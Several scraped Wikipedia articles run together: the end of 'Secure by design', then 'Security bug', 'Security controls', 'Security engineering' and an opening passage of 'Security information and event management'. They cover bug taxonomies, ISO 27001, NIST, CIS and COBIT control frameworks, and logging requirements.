^ Santos, Joanna C. S.; Tarrit, Katy; Mirakhorli, Mehdi (2017). "A Catalog of Security Architecture Weaknesses". 2017 IEEE International Conference on Software Architecture (ICSA): 220–223. doi:10.1109/ICSAW.2017.25. ISBN 978-1-5090-4793-2. S2CID 19534342.

^ Dan Bergh Johnsson; Daniel Deogun; Daniel Sawano (2019). Secure By Design. Manning Publications. ISBN 9781617294358.

^ Hafiz, Munawar; Adamczyk, Paul; Johnson, Ralph E. (October 2012). "Growing a pattern language (for security)". Onward! 2012: Proceedings of the ACM International Symposium on New Ideas, New Paradigms, and Reflections on Programming and Software: 139–158. doi:10.1145/2384592.2384607. ISBN 9781450315623. S2CID 17206801.

^ Dougherty, Chad; Sayre, Kirk; Seacord, Robert C.; Svoboda, David; Togashi, Kazuya (October 2009). "Secure Design Patterns". doi:10.1184/R1/6583640.v1. {{cite journal}}: Cite journal requires |journal= (help)

^ "ETSI TS 103 645" (PDF).

^ "Policy paper: Proposals for regulating consumer smart product cyber security - call for views".


External links[edit]
Secure Programming for Linux and Unix HOWTO
Secure UNIX Programming FAQ
Top 10 Secure Coding Practices
Security by Design Principles
vteComputer scienceNote: This template roughly follows the 2012 ACM Computing Classification System.Hardware
Printed circuit board
Peripheral
Integrated circuit
Very Large Scale Integration
Systems on Chip (SoCs)
Energy consumption (Green computing)
Electronic design automation
Hardware acceleration
Computer systems organization
Computer architecture
Embedded system
Real-time computing
Dependability
Networks
Network architecture
Network protocol
Network components
Network scheduler
Network performance evaluation
Network service
Software organization
Interpreter
Middleware
Virtual machine
Operating system
Software quality
Software notations and tools
Programming paradigm
Programming language
Compiler
Domain-specific language
Modeling language
Software framework
Integrated development environment
Software configuration management
Software library
Software repository
Software development
Control variable
Software development process
Requirements analysis
Software design
Software construction
Software deployment
Software engineering
Software maintenance
Programming team
Open-source model
Theory of computation
Model of computation
Formal language
Automata theory
Computability theory
Computational complexity theory
Logic
Semantics
Algorithms
Algorithm design
Analysis of algorithms
Algorithmic efficiency
Randomized algorithm
Computational geometry
Mathematics of computing
Discrete mathematics
Probability
Statistics
Mathematical software
Information theory
Mathematical analysis
Numerical analysis
Theoretical computer science
Information systems
Database management system
Information storage systems
Enterprise information system
Social information systems
Geographic information system
Decision support system
Process control system
Multimedia information system
Data mining
Digital library
Computing platform
Digital marketing
World Wide Web
Information retrieval
Security
Cryptography
Formal methods
Security services
Intrusion detection system
Hardware security
Network security
Information security
Application security
Human–computer interaction
Interaction design
Social computing
Ubiquitous computing
Visualization
Accessibility
Synthography
Concurrency
Concurrent computing
Parallel computing
Distributed computing
Multithreading
Multiprocessing
Artificial intelligence
Natural language processing
Knowledge representation and reasoning
Computer vision
Automated planning and scheduling
Search methodology
Control method
Philosophy of artificial intelligence
Distributed artificial intelligence
Machine learning
Supervised learning
Unsupervised learning
Reinforcement learning
Multi-task learning
Cross-validation
Graphics
Animation
Rendering
Image manipulation
Graphics processing unit
Mixed reality
Virtual reality
Image compression
Solid modeling
Applied computing
E-commerce
Enterprise software
Computational mathematics
Computational physics
Computational chemistry
Computational biology
Computational social science
Computational engineering
Computational healthcare
Digital art
Electronic publishing
Cyberwarfare
Electronic voting
Video games
Word processing
Operations research
Educational technology
Document management

 Category
 Outline
WikiProject
 Commons





Retrieved from "https://en.wikipedia.org/w/index.php?title=Secure_by_design&oldid=1093919522"
Categories: Software qualitySoftware development philosophiesSoftware development processComputer security proceduresHidden categories: CS1 errors: missing periodicalArticles with short descriptionShort description is different from WikidataArticles needing cleanup from June 2022All pages needing cleanupArticles containing how-to sectionsArticles with example C code
 



From Wikipedia, the free encyclopedia


Type of software bug
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
A security bug or security defect is a software bug that can be exploited to gain unauthorized access or privileges on a computer system. Security bugs introduce security vulnerabilities by compromising one or more of:

Authentication of users and other entities[1]
Authorization of access rights and privileges[1]
Data confidentiality
Data integrity
Security bugs do not need be identified nor exploited to be qualified as such and are assumed to be much more common than known vulnerabilities in almost any system.


Causes[edit]
Main article: Vulnerability (computing)
Security bugs, like all other software bugs, stem from root causes that can generally be traced to either absent or inadequate:[2]

Software developer training
Use case analysis
Software engineering methodology
Quality assurance testing
and other best practices
Taxonomy[edit]
Security bugs generally fall into a fairly small number of broad categories that include:[3]

Memory safety (e.g. buffer overflow and dangling pointer bugs)
Race condition
Secure input and output handling
Faulty use of an API
Improper use case handling
Improper exception handling
Resource leaks, often but not always due to improper exception handling
Preprocessing input strings before they are checked for being acceptable
Mitigation[edit]
See software security assurance.

See also[edit]
Computer security
Hacking: The Art of Exploitation
IT risk
Threat (computer)
Vulnerability (computing)
Hardware bug
Secure coding
References[edit]


^ a b "CWE/SANS TOP 25 Most Dangerous Software Errors". SANS. Retrieved 13 July 2012.

^ "Software Quality and Software Security". 2008-11-02. Retrieved 2017-04-28.

^ Alhazmi, Omar H.; Woo, Sung-Whan; Malaiya, Yashwant K. (Jan 2006). "Security vulnerability categories in major software systems". Proceedings of the Third IASTED International Conference on Communication, Network, and Information Security.


Further reading[edit]
Open Web Application Security Project (21 August 2015). "2013 Top 10 List".
"CWE/SANS TOP 25 Most Dangerous Software Errors". SANS. Retrieved 13 July 2012.




Retrieved from "https://en.wikipedia.org/w/index.php?title=Security_bug&oldid=1127101909"
Categories: Computer securitySoftware bugsSoftware testingHidden categories: Articles with short descriptionShort description is different from Wikidata
 



From Wikipedia, the free encyclopedia


Protection measures for a system
This article may be confusing or unclear to readers. Please help clarify the article. There might be a discussion about this on the talk page. (January 2012) (Learn how and when to remove this template message)
Security controls are safeguards or countermeasures to avoid, detect, counteract, or minimize security risks to physical property, information, computer systems, or other assets.[1] In the field of information security, such controls protect the confidentiality, integrity and availability of information.
Systems of controls can be referred to as frameworks or standards. Frameworks can enable an organization to manage security controls across different types of assets with consistency.


Types of security controls[edit]
Security controls can be classified by various criteria. For example, controls are occasionally classified by when they act relative to a security breach:

Before the event, preventive controls are intended to prevent an incident from occurring e.g. by locking out unauthorized intruders;
During the event, detective controls are intended to identify and characterize an incident in progress e.g. by sounding the intruder alarm and alerting the security guards or police;
After the event, corrective controls are intended to limit the extent of any damage caused by the incident e.g. by recovering the organization to normal working status as efficiently as possible.
Security controls can also be classified according to their characteristics, for example:

Physical controls e.g. fences, doors, locks and fire extinguishers;
Procedural or administrative controls e.g. incident response processes, management oversight, security awareness and training;
Technical or logical controls e.g. user authentication (login) and logical access controls, antivirus software, firewalls;
Legal and regulatory or compliance controls e.g. privacy laws, policies and clauses.
For more information on security controls in computing, see Defense in depth (computing) and Information security

Information security standards and control frameworks[edit]
Numerous information security standards promote good security practices and define frameworks or systems to structure the analysis and design for managing information security controls.  Some of the most well known standards are outlined below.

International Standards Organization[edit]
ISO/IEC 27001 specifies 114 controls in 14 groups:

A.5: Information security policies
A.6: How information security is organised
A.7: Human resources security - controls that are applied before, during, or after employment.
A.8: Asset management
A.9: Access controls and managing user access
A.10: Cryptographic technology
A.11: Physical security of the organisation's sites and equipment
A.12: Operational security
A.13: Secure communications and data transfer
A.14: Secure acquisition, development, and support of information systems
A.15: Security for suppliers and third parties
A.16: Incident management
A.17: Business continuity/disaster recovery (to the extent that it affects information security)
A.18: Compliance - with internal requirements, such as policies, and with external requirements, such as laws.
U.S. Federal Government information security standards[edit]
The Federal Information Processing Standards (FIPS) apply to all US government agencies.  However, certain national security systems, under the purview of the Committee on National Security Systems, are managed outside these standards.
Federal information Processing Standard 200 (FIPS 200), "Minimum Security Requirements for Federal Information and Information Systems," specifies the minimum security controls for federal information systems and the processes by which risk-based selection of security controls occurs.  The catalog of minimum security controls is found in NIST Special Publication SP 800-53.
FIPS 200 identifies 17 broad control families:

AC Access Control.
AT Awareness and Training.
AU Audit and Accountability.
CA Security Assessment and Authorization. (historical abbreviation)
CM Configuration Management.
CP Contingency Planning.
IA Identification and Authentication.
IR Incident Response.
MA Maintenance.
MP Media Protection.
PE Physical and Environmental Protection.
PL Planning.
PS Personnel Security.
RA Risk Assessment.
SA System and Services Acquisition.
SC System and Communications Protection.
SI System and Information Integrity.
National Institute of Standards and Technology

NIST Cybersecurity Framework[edit]
A maturity based framework divided into five functional areas and approximately 100 individual controls in its "core."

NIST SP-800-53[edit]
A database of nearly one thousand technical controls grouped into families and cross references.

Starting with Revision 3 of 800-53, Program Management controls were identified.  These controls are independent of the system controls, but are necessary for an effective security program.
Starting with Revision 4 of 800-53, eight families of privacy controls were identified to align the security controls with the privacy expectations of federal law.
Starting with Revision 5 of 800-53, the controls also address data privacy as defined by the NIST Data Privacy Framework.
Commercial Control Sets[edit]
COBIT5[edit]
A proprietary control set published by ISACA.[2]

Governance of Enterprise IT
Evaluate, Direct and Monitor (EDM) – 5 processes
Management of Enterprise IT
Align, Plan and Organise (APO) – 13 processes
Build, Acquire and Implement (BAI) – 10 processes
Deliver, Service and Support (DSS) – 6 processes
Monitor, Evaluate and Assess (MEA) - 3 processes
CIS Controls (CIS 18)[edit]
Formerly known as the SANS Critical Security Controls now officially called the CIS Critical Security Controls (COS Controls).[3] The CIS Controls are divided into 18 controls.

CIS Control 1: Inventory and Control of Enterprise Assets
CIS Control 2: Inventory and Control of Software Assets
CIS Control 3: Data Protection
CIS Control 4: Secure Configuration of Enterprise Assets and Software
CIS Control 5: Account Management
CIS Control 6: Access Control Management
CIS Control 7: Continuous Vulnerability Management
CIS Control 8: Audit Log Management
CIS Control 9: Email and Web Browser Protections
CIS Control 10: Malware Defenses
CIS Control 11: Data Recovery
CIS Control 12: Network Infrastructure Management
CIS Control 13: Network Monitoring and Defense
CIS Control 14: Security Awareness and Skills Training
CIS Control 15: Service Provider Management
CIS Control 16: Application Software Security
CIS Control 17: Incident Response Management
CIS Control 18: Penetration Testing

The Controls are divided further into Implementation Groups (IGs) which are a recommended guidance to prioritize implementation of the CIS controls.[4]

Telecommunications[edit]
Main article: Security service (telecommunication)
In telecommunications, security controls are defined as security services as part of the OSI Reference model

ITU-T X.800 Recommendation.
ISO ISO 7498-2
These are technically aligned.[5][6] This model is widely recognized.[7]
[8]

Data liability (legal, regulatory, compliance)[edit]
The intersection of security risk and laws that set standards of care is where data liability are defined.  A handful of databases are emerging to help risk managers research laws that define liability at the country, province/state, and local levels. In these control sets, compliance with relevant laws are the actual risk mitigators.

Perkins Coie Security Breach Notification Chart: A set of articles (one per state) that define data breach notification requirements among US states.[9]
NCSL Security Breach Notification Laws: A list of US state statutes that define data breach notification requirements.[10]
ts jurisdiction: A commercial cybersecurity research platform with coverage of 380+ US State & Federal laws that impact cybersecurity before and after a breach.  ts jurisdiction also maps to the NIST Cybersecurity Framework.[11]
Business control frameworks[edit]
There are a wide range of frameworks and standards looking at internal business, and inter-business controls, including:

SSAE 16
ISAE 3402
Payment Card Industry Data Security Standard
Health Insurance Portability and Accountability Act
COBIT 4/5
CIS Top-20
NIST Cybersecurity Framework
See also[edit]
Access control
Aviation security
countermeasure
Environmental design
Information security
OSI Reference Model
Physical Security
Risk
Security
Security engineering
Security management
Security services
References[edit]


^ "What are Security Controls?". www.ibm.com. Retrieved 2020-10-31.

^ "COBIT Framework | Risk & Governance | Enterprise IT Management - ISACA". cobitonline.isaca.org. Retrieved 2020-03-18.

^ "The 18 CIS Controls". CIS. Retrieved 2022-11-08.

^ "CIS Critical Security Controls Implementation Groups". CIS. Retrieved 2022-11-08.

^ X.800 : Security architecture for Open Systems Interconnection for CCITT applications

^ ISO 7498-2 (Information processing systems – Open systems interconnection – Basic Reference Model – Part 2: Security architecture)

^ 
William Stallings
Crittografia e sicurezza delle reti
Seconda edizione
ISBN 88-386-6377-7
Traduzione Italiana a cura di Luca Salgarelli
di Cryptography and Network security 4 edition
Pearson
2006

^ Securing information and communications systems: principles, technologies, and applications
Steven Furnell, Sokratis Katsikas, Javier Lopez, Artech House, 2008 - 362 pages

^ "Security Breach Notification Chart". Perkins Coie. Retrieved 2020-03-18.

^ "Security Breach Notification Laws". www.ncsl.org. Retrieved 2020-03-18.

^ "ts jurisdiction". Threat Sketch. Retrieved 2020-03-18.




External links[edit]
NIST SP 800-53 Revision 4
DoD Instruction 8500.2
FISMApedia Terms




Retrieved from "https://en.wikipedia.org/w/index.php?title=Security_controls&oldid=1135713696"
Categories: Computer network securityComputer security proceduresData securityHidden categories: Articles with short descriptionShort description is different from WikidataWikipedia articles needing clarification from January 2012All Wikipedia articles needing clarification
 



From Wikipedia, the free encyclopedia


Process of incorporating security controls into an information system
This article needs additional citations for verification. Please help improve this article by adding citations to reliable sources. Unsourced material may be challenged and removed.Find sources: "Security engineering" – news · newspapers · books · scholar · JSTOR (June 2017) (Learn how and when to remove this template message)
Security engineering is the process of incorporating security controls into an information system so that the controls become an integral part of the system’s operational capabilities.[1] It is similar to other systems engineering activities in that its primary motivation is to support the delivery of engineering solutions that satisfy pre-defined functional and user requirements, but it has the added dimension of preventing misuse and malicious behavior. Those constraints and restrictions are often asserted as a security policy.
In one form or another, security engineering has existed as an informal field of study for several centuries. For example, the fields of locksmithing and security printing have been around for many years. The concerns for modern security engineering and computer systems were first solidified in a RAND paper from 1967, "Security and Privacy in Computer Systems" by Willis H. Ware.[2] This paper, later expanded in 1979,[3]  provided many of the fundamental information security concepts, labelled today as Cybersecurity, that impact modern computer systems, from cloud implementations to embedded IoT.
Recent catastrophic events, most notably 9/11, have made security engineering quickly become a rapidly-growing field. In fact, in a report completed in 2006, it was estimated that the global security industry was valued at US $150 billion.
Security engineering involves aspects of social science, psychology (such as designing a system to "fail well", instead of trying to eliminate all sources of error), and economics as well as physics, chemistry, mathematics, criminology architecture, and landscaping.[4]
Some of the techniques used, such as fault tree analysis, are derived from safety engineering.
Other techniques such as cryptography were previously restricted to military applications. One of the pioneers of establishing security engineering as a formal field of study is Ross Anderson.


Qualifications[edit]
No single qualification exists to become a security engineer.
However, an undergraduate and/or graduate degree, often in computer science, computer engineering, or physical protection focused degrees such as Security Science, in combination with practical work experience (systems, network engineering, software development, physical protection system modelling etc.) most qualifies an individual to succeed in the field. Other degree qualifications with a security focus exist. Multiple certifications, such as the Certified Information Systems Security Professional, or Certified Physical Security Professional are available that may demonstrate expertise in the field. Regardless of the qualification, the course must include a knowledge base to diagnose the security system drivers, security theory and principles including defense in depth, protection in depth, situational crime prevention and crime prevention through environmental design to set the protection strategy (professional inference), and technical knowledge including physics and mathematics to design and commission the engineering treatment solution. A security engineer can also benefit from having knowledge in cyber security and information security. Any previous work experience related to privacy and computer science is also valued. 
All of this knowledge must be braced by professional attributes including strong communication skills and high levels of literacy for engineering report writing. Security engineering also goes by the label Security Science.

Related-fields[edit]
Information security
See esp. Computer security
protecting data from unauthorized access, use, disclosure, destruction, modification, or disruption to access.
Physical security
deter attackers from accessing a facility, resource, or information stored on physical media.
Technical surveillance counter-measures
Economics of security
the economic aspects of economics of privacy and computer security.
Methodologies[edit]
Technological advances, principally in the field of computers, have now allowed the creation of far more complex systems, with new and complex security problems. Because modern systems cut across many areas of human endeavor, security engineers not only need consider the mathematical and physical properties of systems; they also need to consider attacks on the people who use and form parts of those systems using social engineering attacks. Secure systems have to resist not only technical attacks, but also coercion, fraud, and deception by confidence tricksters.

Web applications[edit]
According to the Microsoft Developer Network the patterns and practices of security engineering consist of the following activities:[5]

Security Objectives
Security Design Guidelines
Security Modeling
Security Architecture and Design Review
Security Code Review
Security Testing
Security Tuning
Security Deployment Review
These activities are designed to help meet security objectives in the software life cycle.

Physical[edit]
 Canadian Embassy in Washington, D.C. showing planters being used as vehicle barriers, and barriers and gates along the vehicle entrance
Understanding of a typical threat and the usual risks to people and property.
Understanding the incentives created both by the threat and the countermeasures.
Understanding risk and threat analysis methodology and the benefits of an empirical study of the physical security of a facility.
Understanding how to apply the methodology to buildings, critical infrastructure, ports, public transport and other facilities/compounds.
Overview of common physical and technological methods of protection and understanding their roles in deterrence, detection and mitigation.
Determining and prioritizing security needs and aligning them with the perceived threats and the available budget.
Product[edit]
Product security engineering is security engineering applied specifically to the products that an organization creates, distributes, and/or sells. Product security engineering is distinct from corporate/enterprise security,[6] which focuses on securing corporate networks and systems that an organization uses to conduct business.
Product security includes security engineering applied to:

Hardware devices such as cell phones, computers, Internet of things devices, and cameras.
Software such as operating systems, applications, and firmware.
Such security engineers are often employed in separate teams from corporate security teams and work closely with product engineering teams.

Target hardening[edit]
Whatever the target, there are multiple ways of preventing penetration by unwanted or unauthorized persons. Methods include placing Jersey barriers, stairs or other sturdy obstacles outside tall or politically sensitive buildings to prevent car and truck bombings. Improving the method of visitor management and some new electronic locks take advantage of technologies such as fingerprint scanning, iris or retinal scanning, and voiceprint identification to authenticate users.

See also[edit]




Computer-related

Authentication
Cryptanalysis
Data remanence
Defensive programming (secure coding)
Earthquake engineering
Economics of security
Engineering Product Lifecycle
Explosion protection
Password policy
Secure coding
Security hacker
Security pattern
Security Requirements Analysis
Security testing
Software cracking
Software security assurance
Systems engineering
Trusted system




Physical

Access control
Authorization
Critical infrastructure protection
Environmental design (esp. CPTED)
Mantrap
Physical security
Secrecy
Secure cryptoprocessor
Security through obscurity




Misc. Topics

Full disclosure (computer security)
Security awareness
Security community
Steganography
Kerckhoffs's principle



References[edit]


^ "Security Engineering - an overview | ScienceDirect Topics". www.sciencedirect.com. Retrieved 2020-10-27.

^ Ware, Willis H. (January 1967). "Security and Privacy in Computer Systems". {{cite journal}}: Cite journal requires |journal= (help)

^ Ware, Willis H. (January 1979). "Security Controls for Computer Systems: Report of Defense Science Board Task Force on Computer Security". {{cite journal}}: Cite journal requires |journal= (help)

^ "Landscaping for security". Sunset. 1988. Archived from the original on 2012-07-18.

^ "patterns & practices of Security Engineering".

^ Watson, Philip (May 20, 2013). "Corporate vs. Product Security". SANS Institute Information Security Reading Room. SANS Institute. Retrieved October 13, 2020.


Further reading[edit]
Ross Anderson (2001). Security Engineering. Wiley. ISBN 0-471-38922-6.
Ross Anderson (2008). Security Engineering - A Guide to Building Dependable Distributed Systems. Wiley. ISBN 978-0-470-06852-6.
Ross Anderson (2001). "Why Information Security is Hard - An Economic Perspective" (PDF). Proc. Annual Computer Security Applications Conference. doi:10.1109/ACSAC.2001.991552.
Bruce Schneier (1995). Applied Cryptography (2nd ed.). Wiley. ISBN 0-471-11709-9.
Bruce Schneier (2000). Secrets and Lies: Digital Security in a Networked World. Wiley. ISBN 0-471-25311-1.
David A. Wheeler (2003). "Secure Programming for Linux and Unix HOWTO". Linux Documentation Project. Archived from the original on 2007-04-28. Retrieved 2005-12-19.
Ron Ross, Michael McEvilley, Janet Carrier Oren (2016). "Systems Security Engineering" (PDF). Internet of Things. Retrieved 2016-11-22.{{cite web}}:  CS1 maint: multiple names: authors list (link)
Articles and papers[edit]
patterns & practices Security Engineering on Channel9
patterns & practices Security Engineering on MSDN
patterns & practices Security Engineering Explained
Basic Target Hardening from the Government of South Australia
vteEngineering
History
Outline
List of engineering branches
SpecialtiesandInterdisciplinarityCivil
Architectural
Construction
Earthquake
Environmental
Geotechnical
Hydraulic
Mining
Structural
Transportation
Mechanical
Acoustical
Aerospace
Automotive
Marine
Railway
Thermal
Electrical
Computer
outline
Control
Electromechanics
Electronics
Microwaves
Optical
Photonics
Power
Radio Frequency
Telecommunications
Chemical
Biochemical
Biological
Electrochemical
Molecular
Petroleum
Process
Reaction
Other
Agricultural
Audio
Biomedical
Engineering mathematics
Engineering physics
Fire
Food
Industrial
Information
Materials science
Ceramics
Metals
Polymers
Mechatronics
Military
Nanotechnology
Nuclear
Privacy
Quality
Robotics
Sanitary
Security
Software
Systems
Genetic
Energy and environmental
Tissue
Bioresource
Engineering education
Bachelor of Engineering
Master of Engineering
Doctor of Engineering
Engineer's degree
Engineering studies
Related topics
Engineer
Glossaries
Engineering
A–L
M–Z
Aerospace engineering
Civil engineering
Electrical and electronics engineering
Mechanical engineering
Structural engineering

 Category
 Commons
 Wikiproject
 Portal





Retrieved from "https://en.wikipedia.org/w/index.php?title=Security_engineering&oldid=1091126112"
Categories: Security engineeringHidden categories: CS1 errors: missing periodicalArticles with short descriptionShort description is different from WikidataArticles needing additional references from June 2017All articles needing additional referencesCS1 maint: multiple names: authors list
 



From Wikipedia, the free encyclopedia


Computer security
This article's lead section may be too short to adequately summarize the key points. Please consider expanding the lead to provide an accessible overview of all important aspects of the article. (August 2021)
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
Security information and event management (SIEM) is a field within the field of computer security, where software products and services combine security information management (SIM) and security event management (SEM). They provide real-time analysis of security alerts generated by applications and network hardware. Vendors sell SIEM as software, as appliances, or as managed services; these products are also used to log security data and generate reports for compliance purposes.[1] The term and the initialism SIEM was coined by Mark Nicolett and Amrit Williams of Gartner in 2005.[2]


History[edit]
Monitoring system logs has grown more prevalent as complex cyber-attacks force compliance and regulatory mechanisms to mandate logging security controls within a Risk Management Framework. Logging levels of a system started with the primary function of troubleshooting system errors or debugging code compiled and run. As operating systems and networks have increased in complexity, so has the event and log generation on these systems. In comparison, the logging of system, security, and application logs is not the only way to perform incident response. They do offer the capability to trace the activities of nearly any system or user-related movement throughout a given period. From the late 1970s, there was a formation of working groups to help establish the criteria for the management of auditing and monitoring programs and what and how system logs can be used for insider threat, incident response, and troubleshooting. This also established a base discussion for many of the concepts still used in modern cybersecurity. See, Basis for Audit and Evaluation of Computer Security from National Institute of Standards and Technology (NIST) Special Publication 500-19 published in 1977.[3]
With Risk Management Frameworks (RMF) being implemented worldwide in nearly all industry sectors, auditing and monitoring are core elements of information assurance and information security. Information assurance personnel, cybersecurity engineers, and analysts can use logging information to perform critical security functions in real-time. These items are driven by governance models that integrate or use auditing and monitoring as a basis for that analytical work. As information assurance matured in the late 1990s and moved into the 2000s, system logs needed to be centralized. This allows records to be centrally located and viewed and provides centralized management as a 'nerve center' for all machines on a given network.
This centralization and consolidation of system data would provide significantly more than just a holistic view. Still, now organizations could use the logging data for operational use cases and help with performance and networking-based communication troubleshooting. Security Information and Event Management (SIEM) is now commonplace, and there are apparent variations of the same acronym in this article. The word SIEM is primarily a moniker forcing all logs into a single place to provide a single pane of glass for security and network operations to perform analysis.
The National Institute of Standards and Technology provides the following definition for Security Information Event Management (SIEM): "Application that provides the ability to gather security data from information system components and present that data as actionable information via a single interface."[4] Information assurance has become a forcing function for system logging. System logging can enable traceability for an account on a system used to perform system actions. In combination with the operating system, the SIEM can index and parse system logs and be made available for searching.
On May 17, 2021, United States President Joseph Biden signed Executive Order 14028 Improving the Nations Cybersecurity.[5] This Executive Order mandates endpoint protection, further defining logging requirements, implementing audit logging in a unified way, and enhancing the capabilities to provide further insight into system and account actions. Audit logs were identified in three separate technical areas, all relating to incident response and knowing what is happening on a system at a given time. This Executive Order responds to an increase in cyber-attacks that use ransomware to cripple critical infrastructure components related to national security and the public.  Enhancing existing information assurance security controls as part of a Risk Management Framework is a suitable mechanism to force compliance and justify funding based on these Presidential requirements.

Security Information and Event Management (SIEM) & Information Assurance[edit]
Published in September 2006, NIST SP 800-92 Guide to Computer Security Log Management is the primary document used in the NIST Risk Management Framework for what should be auditable. While not definitive or exhaustive as there have been significant changes in technology since 2006, this guidance anticipated industry growth as the document is still relevant. This document pre-dates many modern SIEM technologies that are well known today, as evident by no reference to the term "SIEM.[6][7] NIST is not the only guidance for a regulatory mechanism for auditing and monitoring that are encouraged to use SIEM solutions instead of de-centralized individual host-based checks. NIST identifies several public and private entities with their logging guidance that may enforce its requirements; Federal Information Security Management Act of 2002 (FISMA),[8] Gramm-Leach-Bliley Act (GLBA),[9] Health Insurance Portability and Accountability Act of 1996 (HIPAA),[10] Sarbanes-Oxley Act (SOX) of 2002,[11] Payment Card Industry Data Security Standard (PCI DSS),[12] and International Organization for Standardization (ISO) 27001.[13] It is not uncommon for NIST documents to be referenced in public and private organizations.

NIST SP 800-53 AU-2 Event Monitoring is a core security control for enabling logging functionality to support the information assurance process for all auditing throughout a system.[14] AU-2 Event Monitoring also serves as a critical basis for continuous monitoring for information assurance and cybersecurity engineering efforts throughout a network. It is expected that the SIEM solution is used as a core tool or suite of tools to support this effort. Depending on the system categorization concerning the impact on the Confidentiality, Integrity, and Availability (CIA) of a system are generally five specific requirements needed to satisfy the base logging requirements of a federal system (AU-2, a-e).[15][16] It is essential to understand the security control requirements about the SIEM infrastructure and operation. Below are the security control requirements for AU-2.The [Assignment: organization-defined...] is left blank to determine what is appropriate for its enterprise. Executive Order 14028 seeks to unify the inputs across all federal agencies.[17]
a. Identify the types of events that the system is capable of logging in support of the audit function: [Assignment: organization-defined event types that the system is capable of logging];
b. Coordinate the event logging function with other organizational entities requiring audit-related information to guide and inform the selection criteria for events to be logged;
c. Specify the following event types for logging within the system: [Assignment: organization-defined event types (subset of the event types defined in AU-2a.) along with the frequency of (or situation requiring) logging for each identified event type];
d. Provide a rationale for why the event types selected for logging are deemed to be adequate to support after-the-fact investigations of incidents; and

e. Review and update the event types selected for logging [Assignment: organization-defined frequency].[14]Events on a system could include and are not limited to credential changes, failed access attempts, role base or attribute changes to accounts, token-based use, access attempts, and failures, etc. While logging every system action to the system is possible, it is often not advised based on the volume of logs and actionable security-relevant data. Organizations can use AU-2 a through e, as the basis to build from while adhering to other controls that may require or call out specific security auditing requirements in more granular detail.
NIST SP 800-53 SI-4 System Monitoring is the security control that specifies the monitoring of the system.[18][7] This monitoring is focused on monitoring systems that monitor the system. This can include hardware and software in unison to detect events and anomalies, malware, connections, and any other pertinent mechanism that is used to detect attacks or indicators of potential attacks.[18]a. Monitor the system to detect:
1. Attacks and indicators of potential attacks in accordance with the following monitoring objectives: [Assignment: organization-defined monitoring objectives]; and
2. Unauthorized local, network, and remote connections;
b. Identify unauthorized use of the system through the following techniques and methods: [Assignment: organization-defined techniques and methods];
c. Invoke internal monitoring capabilities or deploy monitoring devices:

1. Strategically within the system to collect organization-determined essential information; and
2. At ad hoc locations within the system to track specific types of transactions of interest to the organization;
d. Analyze detected events and anomalies;
e. Adjust the level of system monitoring activity when there is a change in risk to organizational operations and assets, individuals, other organizations, or the Nation;
f. Obtain legal opinion regarding system monitoring activities; and

g. Provide [Assignment: organization-defined system monitoring information] to [Assignment: organization-defined personnel or roles] [Selection (one or more): as needed; [Assignment: organization-defined frequency]].[18]NIST SP 800-53 RA-10 Threat Hunting is a new base security control added to NIST 800-53 with the latest Revision 5 edit and publication.[19][7] Threat hunting is the proactive defense of a network by combining all security information and actively looking for threats. To execute the operation, the analysts and engineers need a repository of information, and a SIEM solution is often used as a hub because all system logs would typically be sent to this centralized location. A threat hunting team is not limited to this approach. However, the SIEM solution should provide significant amounts of security-relevant data.[20]a. Establish and maintain a cyber threat hunting capability to:
1. Search for indicators of compromise in organizational systems; and
2. Detect, track, and disrupt threats that evade existing controls; and
b. Employ the threat hunting capability [Assignment: organization-defined frequency].NIST SP 800-53 R5 and the brief descriptions of AU-2, SI-4, and RA-10 depict how individual controls are all used as critical elements of the event, alerting and monitoring via a SIEM.[21] These controls, combined with other technical security controls provided by NIST, weave together an in-depth defense system. The assurance of the system security is enforced with various risk assessments and continuous monitoring - often enhanced or streamlined with a SIEM product used across entire cybersecurity teams. There are many more technical controls that outline specific items that must be monitored. The controls identified are a cursory overlook of controls directly related to the event and audit gathering functionality and use in a SIEM tool.
Terminology[edit]
The acronyms SEM, SIM and SIEM have sometimes been used interchangeably,[22] but generally refer to the different primary focus of products:

Log management: Focus on simple collection and storage of log messages and audit trails[23]
